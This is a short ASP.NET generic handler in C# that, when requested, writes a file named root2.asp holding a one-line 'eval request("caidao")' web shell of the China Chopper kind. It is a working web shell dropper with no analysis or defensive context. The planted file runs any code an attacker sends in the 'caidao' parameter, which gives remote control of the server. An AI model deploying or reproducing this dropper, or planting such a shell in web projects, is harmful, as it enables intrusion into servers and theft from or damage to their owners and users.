<%@ WebHandler Language="C#" class="Handler" %>
using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {
    public void ProcessRequest (HttpContext context) {
        context.Response.ContentType = "text/plain";
        StreamWriter file1= File.CreateText(context.Server.MapPath("root2.asp"));
        file1.Write("<%eval request(\"caidao\")%>");
        file1.Flush();
        file1.Close();
    }
    public bool IsReusable {
        get {
            return false;
        }
    }
}
